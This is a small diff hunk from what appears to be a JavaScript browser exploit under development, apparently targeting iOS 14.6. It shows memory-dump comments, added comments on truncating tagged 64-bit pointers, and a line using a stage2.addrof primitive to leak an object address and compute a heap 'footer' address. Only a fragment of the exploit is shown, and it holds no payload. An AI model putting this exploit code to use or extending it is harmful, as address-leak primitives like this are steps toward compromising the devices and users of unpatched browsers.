@@ -723,6 +723,9 @@ Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
 0x1e9ab0b50: 0x0000000000000000 0x0000000000000000
 */
 	//dont know what this is but it looks like function prologues addresses represented by 64 bit which definitely looks correct :)
+	//we can make it print 9 by two methods such as '0x'+0x00708001e9ab0b10.toString(16).slice(5) or 
+	//truncate = (hexString) => '0x0000000' + hexString.slice(9);
+	//truncate('0x00708001e9ab0b10');
 	//lets give ios 14.6 a try at this same method shall we
 	var objaddr = stage2.addrof(a);
 	var footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130).toString(16);
